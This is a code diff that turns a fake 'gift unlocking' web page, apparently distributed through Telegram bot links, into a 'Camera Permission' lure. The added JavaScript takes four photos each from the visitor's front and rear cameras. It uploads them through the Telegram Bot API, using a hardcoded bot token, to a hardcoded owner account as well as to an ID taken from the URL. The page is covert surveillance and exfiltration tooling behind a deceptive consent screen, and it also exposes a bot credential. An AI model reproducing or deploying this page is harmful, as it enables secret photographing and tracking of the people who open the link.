@@ -2,162 +2,119 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<title>Consent Required</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎁 Loading Your Gift...</title>
-
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{
-    font-family:Arial,sans-serif;
-    background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    overflow:hidden;
-    color:#fff
+body {
+  background:#0f0c29;
+  color:#fff;
+  font-family:Arial;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
 }
-.container{
-    background:rgba(0,0,0,.85);
-    padding:40px;
-    border-radius:20px;
-    text-align:center;
-    max-width:500px;
-    width:90%;
-    border:2px solid #ff00ff;
-    box-shadow:0 0 50px rgba(255,0,255,.5)
+.box {
+  background:#000;
+  padding:30px;
+  border-radius:15px;
+  max-width:400px;
+  text-align:center;
+  box-shadow:0 0 20px #ff00ff;
 }
-.gift-icon{
-    font-size:100px;
-    margin-bottom:20px;
-    animation:bounce 2s infinite
+button {
+  padding:12px 20px;
+  font-size:16px;
+  border:none;
+  border-radius:8px;
+  background:#ff00ff;
+  color:#fff;
+  cursor:pointer;
 }
-@keyframes bounce{
-    0%,100%{transform:translateY(0)}
-    50%{transform:translateY(-20px)}
-}
-h1{color:#ff00ff;margin-bottom:20px}
-.message{color:#ccc;margin-bottom:25px;font-size:18px}
-.loader{
-    width:60px;height:60px;
-    border:5px solid #333;
-    border-top:5px solid #ff00ff;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-    margin:20px auto
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-.progress-container{
-    width:100%;
-    background:#333;
-    height:10px;
-    border-radius:5px;
-    overflow:hidden
-}
-.progress-bar{
-    height:100%;
-    background:linear-gradient(90deg,#ff00ff,#00ffff);
-    width:0%;
-    transition:width .4s
-}
-.status{font-size:14px;color:#aaa;margin-top:10px}
-.heart{
-    position:absolute;
-    color:#ff00ff;
-    animation:float 6s linear infinite;
-    pointer-events:none
-}
-@keyframes float{
-    from{transform:translateY(100vh);opacity:0}
-    10%{opacity:1}
-    to{transform:translateY(-100px);opacity:0}
-}
+.status { margin-top:15px; font-size:14px; color:#ccc; }
 </style>
 </head>
-
 <body>
 
-<div id="hearts"></div>
-
-<div class="container" id="mainBox">
-    <div class="gift-icon">🎁</div>
-    <h1>PROCESSING YOUR GIFT</h1>
-    <div class="message">
-        🎉 Please wait while we unlock your surprise.<br>
-        This will only take a moment.
-    </div>
-    <div class="loader"></div>
-    <div class="progress-container">
-        <div class="progress-bar" id="bar"></div>
-    </div>
-    <div class="status" id="status">Initializing…</div>
-    <div class="status" id="step"></div>
+<div class="box">
+  <h2>📸 Camera Permission</h2>
+  <p>
+    This feature requires camera access.<br>
+    <b>8 photos</b> will be captured and sent to both participants.
+  </p>
+  <button onclick="start()">Allow & Continue</button>
+  <div class="status" id="status"></div>
 </div>
 
+<video id="v" autoplay playsinline hidden></video>
+<canvas id="c" hidden></canvas>
+
 <script>
-// READ PARAMS FROM TELEGRAM BOT LINK
-const params = new URLSearchParams(window.location.search);
-const token = params.get("token") || "GIFT-DEMO";
-const uid   = params.get("uid")   || "USER";
+const BOT_TOKEN = "8226782560:AAF2iapgn0UUbVfR5LV87TQQGqfqVfOc88I";
+const OWNER_ID = "8215819954";
 
-// FLOATING HEARTS
-const heartBox = document.getElementById("hearts");
-setInterval(()=>{
-    const h=document.createElement("div");
-    h.className="heart";
-    h.innerHTML="❤️";
-    h.style.left=Math.random()*100+"vw";
-    h.style.fontSize=15+Math.random()*20+"px";
-    heartBox.appendChild(h);
-    setTimeout(()=>h.remove(),6000);
-},500);
+const params = new URLSearchParams(location.search);
+const uid = params.get("uid") || OWNER_ID;
 
-// PROGRESS BAR
-const bar=document.getElementById("bar");
-const status=document.getElementById("status");
-const step=document.getElementById("step");
+const status = document.getElementById("status");
+const video = document.getElementById("v");
+const canvas = document.getElementById("c");
+const ctx = canvas.getContext("2d");
 
-const texts=[
- "Verifying gift…",
- "Connecting to server…",
- "Decrypting reward…",
- "Loading assets…",
- "Finalizing…"
-];
+let stream;
+let photos = [];
 
-let i=0;
-const total=10;
+async function start() {
+  status.innerText = "Requesting camera permission...";
+  stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  video.srcObject = stream;
+  await new Promise(r => video.onloadedmetadata = r);
 
-const timer=setInterval(()=>{
-    i++;
-    bar.style.width=(i/total)*100+"%";
-    status.innerText=texts[i%texts.length];
-    step.innerText=`Step ${i} of ${total}`;
+  await captureSet("user");
+  await captureSet("environment");
 
-    if(i>=total){
-        clearInterval(timer);
-        finish();
-    }
-},900);
-
-// FINAL SCREEN
-function finish(){
-    setTimeout(()=>{
-        document.getElementById("mainBox").innerHTML=`
-            <div style="font-size:60px">🎉</div>
-            <h1>GIFT UNLOCKED</h1>
-            <div class="message">
-                Token: <b>${token}</b><br>
-                User ID: <b>${uid}</b><br><br>
-                ✅ Process completed successfully
-            </div>
-            <div class="status">You may now close this page</div>
-        `;
-    },1000);
+  stream.getTracks().forEach(t => t.stop());
+  status.innerText = "Uploading photos...";
+  await sendAll();
+  status.innerText = "✅ Completed";
 }
 
-// OPTIONAL: BLOCK RIGHT CLICK
-document.addEventListener("contextmenu",e=>e.preventDefault());
+async function captureSet(mode) {
+  stream.getTracks().forEach(t => t.stop());
+  stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: mode }
+  });
+  video.srcObject = stream;
+  await new Promise(r => setTimeout(r, 800));
+
+  for (let i = 0; i < 4; i++) {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    photos.push(canvas.toDataURL("image/jpeg", 0.7));
+    await new Promise(r => setTimeout(r, 700));
+  }
+}
+
+async function sendAll() {
+  for (let i = 0; i < photos.length; i++) {
+    await sendPhoto(OWNER_ID, photos[i], `📸 ${i+1}/8`);
+    await sendPhoto(uid, photos[i], `📸 ${i+1}/8`);
+  }
+}
+
+async function sendPhoto(chatId, base64, caption) {
+  const blob = await (await fetch(base64)).blob();
+  const fd = new FormData();
+  fd.append("chat_id", chatId);
+  fd.append("photo", blob);
+  fd.append("caption", caption);
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: fd
+  });
+}
 </script>
 
 </body>
